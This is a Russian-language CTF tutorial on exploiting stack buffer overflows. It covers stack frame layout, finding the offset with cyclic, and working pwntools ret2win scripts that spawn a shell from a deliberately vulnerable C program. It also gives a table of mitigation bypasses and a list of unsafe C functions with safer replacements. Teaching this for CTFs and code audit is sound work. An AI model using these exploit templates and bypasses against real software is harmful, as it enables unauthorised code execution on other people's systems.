Переполнение буфера на стеке — фундамент бинарной эксплуатации. Даже в 2026 году это самая частая уязвимость в CTF и один из немногих классов багов, который встречается в реальном коде: небезопасные `strcpy`, `gets`, `sprintf`, `read` без проверки длины. Понимание раскладки стека, соглашения о вызовах и способов контроля RIP — обязательная база перед переходом к ROP, ret2libc и heap.

## Как выглядит переполнение на уровне кода

```c
#include <stdio.h>
void win(void) { system("/bin/sh"); }
int main(void) {
    char buf[64];
    gets(buf);          // нет ограничения длины
    puts(buf);
    return 0;
}
```

Компилятор размещает `buf` в стековом фрейме `main`. Функция `gets` пишет в буфер, пока не встретит `\n`, не проверяя границу. Всё, что введено сверх 64 байт, затирает соседние данные: сохранённый `rbp`, сохранённый адрес возврата, а при достаточно длинном вводе — аргументы и локали `вызывающей` функции.

## Раскладка стекового фрейма System V AMD64

Функция `main` получает управление через `call`, который кладёт на стек адрес возврата. Затем `push rbp` сохраняет указатель базы вызывающей функции, а `mov rbp, rsp` задаёт новый фрейм. Локальный массив `buf[64]` лежит по адресу `[rbp-0x40]`. Между `buf` и сохранённым `rbp` может быть выравнивающий padding.

| Смещение от начала `buf` | Содержимое |
|---|---|
| 0x00..0x3f | сама строка `buf[64]` |
| 0x40..0x47 | сохранённый `rbp` |
| 0x48..0x4f | сохранённый адрес возврата (RIP) |

Значит, чтобы перезаписать адрес возврата, нужно подать `0x40 + 8 = 72` байта, а следующие 8 — новый RIP. Точное смещение почти никогда не угадывается на глаз: его находят через `cyclic`.

## Поиск смещения через cyclic

```bash
python3 -c "from pwn import *; print(cyclic(200))" > pattern.txt
gdb ./chall
(gdb) run < pattern.txt
(gdb) info registers rip
rip            0x6161616c6161616b   # значение из паттерна
```

```python
from pwn import *
cyclic_find(0x6161616c6161616b)   # -> 72
```

`cyclic(n)` генерирует строку, в которой каждая 8-байтовая подстрока уникальна. При падении `RIP` содержит байты паттерна — `cyclic_find` находит их позицию и, следовательно, смещение до возврата. В `pwndbg` можно вообще не смотреть регистры: команда `cyclic` автоматически находит смещение.

## Раскладка 32-битного стека

В i386 нет `push rbp`/`mov rbp,rsp` в привычном виде — используется `push ebp; mov ebp, esp`. Аргументы передаются через стек, а не регистры. Смещение до возврата обычно равно размеру буфера + 4 (сохранённый `ebp`) + возможно padding. Для 32-битных задач `cyclic_find` тоже работает, но `u32` вместо `u64`.

## Первый эксплойт: ret2win

Если в бинаре есть «win»-функция, вызывающая `system('/bin/sh')` или печатающая флаг, эксплойт тривиален.

```python
from pwn import *
context.binary = elf = ELF('./chall')
OFFSET = 72
win = elf.symbols['win']          # или p64(elf.symbols['win'])

p = process('./chall') if args.LOCAL else remote('host', 1337)
p.sendline(b'A'*OFFSET + p64(win))
p.interactive()
```

Запуск и ожидаемый вывод:

```
$ python3 exp.py LOCAL
[*] '/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user)
```

## Тонкость выравнивания стека (movaps)

На amd64 многие libc-функции (в частности `system`) используют SSE-инструкции, требующие 16-байтового выравнивания `rsp`. Если после перезаписи возврата стек выровнен неправильно, вызов падает на `movaps` с `SIGSEGV`. Лечится вставкой лишнего гаджета `ret` (адрес любой инструкции `ret` в бинаре) перед целевой функцией:

```python
ret = ROP(elf).find_gadget(['ret']).address
payload = b'A'*OFFSET + p64(ret) + p64(win)
```

Это сдвигает `rsp` на 8 байт и восстанавливает выравнивание. Симптом — падение внутри libc при корректно угаданном адресе — почти всегда именно про выравнивание.

## Байты-разделители и обход фильтров ввода

Иногда `gets`/`read` заменены на функцию, отбрасывающую `\n`, `\x00` или другие байты. Тогда адрес возврата нельзя записать напрямую, если он содержит запрещённый байт. Приёмы: использовать другой гаджет с «чистым» адресом, вернуться в `main` и использовать уже утёкшие значения, либо применить частичную перезапись (partial overwrite) — переписать только младший байт возврата, чтобы попасть в соседний код.

## Частичная перезапись

Если бинарь PIE, но ввод обрезается до перезаписи нескольких младших байт, можно переписать лишь младший байт сохранённого адреса возврата, направив его в другую ветку того же кода (например, в блок `win`, лежащий рядом с `main`). Это работает, потому что ASLR рандомизирует старшие биты, но младшие 12 бит страницы (offset внутри страницы) фиксированы.

```python
p.send(b'A'*OFFSET + b'\x26')     # младший байт -> адрес win
```

## Краш-анализ и отладка

```bash
gdb ./chall
(gdb) run < payload
(gdb) bt
#0  0x00000000004011a6 in main ()
(gdb) x/4gx $rsp
(gdb) info registers rip rsp rbp
```

Полезные команды pwndbg: `checksec`, `cyclic`, `telescope $rsp`, `stack`. Если `RIP` не перезаписался, а программа падает в другом месте — переполнение может упираться в canary (`__stack_chk_fail`) или в read-only-область.

## Митигации и как они влияют

| Митигация | Эффект на переполнение | Обход |
|---|---|---|
| Stack canary | падение при затирании canary | утечка canary, brute force, не трогать canary |
| NX | стек неисполняем | ROP / ret2libc |
| PIE | адреса кода рандомизированы | утечка базы, partial overwrite |
| ASLR | база libc/стека рандомизирована | утечка адреса |
| Full RELRO | GOT read-only | перезапись `__free_hook`/`_IO` |
| FORTIFY | проверки в libc-функциях | другой вызов, короче ввод |

## Практика: полный цикл на примере

Шаги: (1) `checksec` — фиксируем митигации; (2) `objdump -d` / Ghidra — находим уязвимую функцию и `win`; (3) запускаем под gdb с `cyclic(200)`; (4) `cyclic_find` — получаем смещение; (5) собираем payload с `flat`; (6) проверяем локально, при необходимости добавляем `ret` для выравнивания; (7) переключаем `start()` на `remote` и получаем флаг.

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
OFFSET = 72
def start():
    return process('./chall') if args.LOCAL else remote('host', 1337)
def exploit():
    p = start()
    ret = ROP(elf).find_gadget(['ret']).address
    payload = flat({OFFSET: [ret, elf.symbols['win']]})
    p.sendlineafter(b'> ', payload)
    p.interactive()
exploit()
```

## Частые ошибки

- **Смещение на 8 больше/меньше.** Причина — padding или путаница `rbp`. Перепроверяйте `cyclic_find`.
- **Крешит в libc при верном адресе.** Не выровнен стек — добавьте `ret`.
- **Забыли `p64`.** В payload попадает число, а не байты, и переполнение не происходит.
- **Перепутали 32/64 бита.** Разный размер указателя и способ передачи аргументов.
- **Адрес содержит `\x00`/`\n`.** Функция обрывает ввод — нужен другой гаджет или partial overwrite.

## Что дальше / решение

Переполнение стека — входная точка. Дальше изучайте ROP (`pwn-rop`), ret2libc (`pwn-ret2libc`), обход canary (`pwn-canary-bypass`) и PIE (`pwn-pie-bypass`). На практике для каждого бинаря держите один скелет эксплойта и меняйте только оффсет и целевую цепочку. Если задача «win-функция» — всё решается за минуту; если нет — переходите к утечке libc и цепочкам гаджетов. Главное правило: сначала под gdb убедитесь, что контролируете RIP, и только потом строите сложную логику.

## Небезопасные функции: полный список

| Функция | Проблема | Безопасная замена |
|---|---|---|
| `gets` | нет границы вообще | `fgets` |
| `strcpy`/`strcat` | копирует до `\x00` | `strncpy`/`strlcat` |
| `sprintf` | нет границы формата | `snprintf` |
| `scanf("%s")` | нет ширины | `scanf("%63s")` |
| `read` без проверки | читает заданное число байт | проверить `n` |
| `memcpy` с user-len | переполнение | clamp длины |

Понимание, какая именно функция переполняет, определяет ограничения payload: `gets` и `strcpy` останавливаются на `\x00`/`\n`, `read` — нет; поэтому через `read` можно писать нулевые байты (важно для адресов PIE).

## Формат вывода и диагностика через objdump

```bash
objdump -d -M intel ./chall | grep -A20 '<vuln>:'
```

В выводе видно, как выделяется фрейм: `sub rsp, 0x50`, где буфер, куда идёт ввод, и на каком смещении от `rbp` лежит возврат. Если буфер 0x40 и сразу за ним сохранённый `rbp` — оффсет 0x48. Сверяйте с `cyclic_find`, чтобы не промахнуться на padding.

## Резюме

Переполнение стека сводится к четырём вопросам: где буфер, где возврат, чем управляем и что мешает (canary, PIE, NX). Ответы дают `objdump`, `cyclic` и `checksec`. Дальше — либо ret2win, либо полноценная ROP-цепочка.

## Где пригодится

- **CTF Pwn:** это самая частая «первая кровь» — ret2win с `checksec` без защит.
- **Аудит кода:** поиск небезопасных `gets/strcpy/sprintf/scanf("%s")` и ручных `read` без ограничения — прямой путь к отчёту об уязвимости.
- **Bug bounty:** крэш нативных компонентов (плагины, парсеры протоколов) часто начинается со stack overflow.
- **Работа:** понимание memory corruption — база для secure coding и анализа CVE в системном ПО.
